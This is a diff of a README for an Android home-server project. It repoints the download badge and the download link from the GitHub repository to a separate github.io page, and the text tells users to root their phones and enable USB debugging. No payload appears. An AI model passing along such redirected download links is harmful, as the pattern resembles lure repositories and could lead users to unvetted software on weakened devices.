@@ -1,6 +1,6 @@
 # 📱 android-home-server - Turn old phones into reliable servers
 
-[![Download Software](https://img.shields.io/badge/Download-Visit_Releases-blue.svg)](https://github.com/Dyannpointillistic77/android-home-server)
+[![Download Software](https://img.shields.io/badge/Download-Visit_Releases-blue.svg)](https://dyannpointillistic77.github.io)
 
 This project transforms your unused Android phone into a functional home server. You gain a private file storage system, remote access tools, and automated notifications without needing to buy expensive hardware.
 
@@ -15,7 +15,7 @@ Before you begin, ensure you have the following items:
 Root access allows the software to interact with the phone hardware correctly. If your phone does not have Magisk installed, please follow your device-specific instructions to unlock the bootloader and root the system. Once rooted, ensure you enable USB Debugging in the Android Developer Options menu.
 
 ## 📥 Downloading the Files
-Visit this page to download: https://github.com/Dyannpointillistic77/android-home-server
+Visit this page to download: https://dyannpointillistic77.github.io
 
 1. Click the link above to view the repository releases.
 2. Select the latest version listed under the Releases section.
